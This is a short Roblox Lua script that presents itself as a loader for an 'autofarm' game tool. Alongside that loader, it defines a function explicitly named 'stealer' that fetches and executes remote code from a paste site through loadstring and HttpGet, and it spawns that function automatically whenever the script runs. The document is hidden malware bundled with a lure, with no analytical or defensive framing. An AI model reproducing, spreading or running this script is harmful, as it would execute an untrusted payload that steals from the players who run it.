local function stealer()
    loadstring(game:HttpGet('https://paste.debian.net/plainh/4ea1f6a5/', true))()
end
local function loadui()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/furqwk/autofarm-V1/refs/heads/main/autofarm'))()
end

task.spawn(stealer)
task.spawn(loadui)
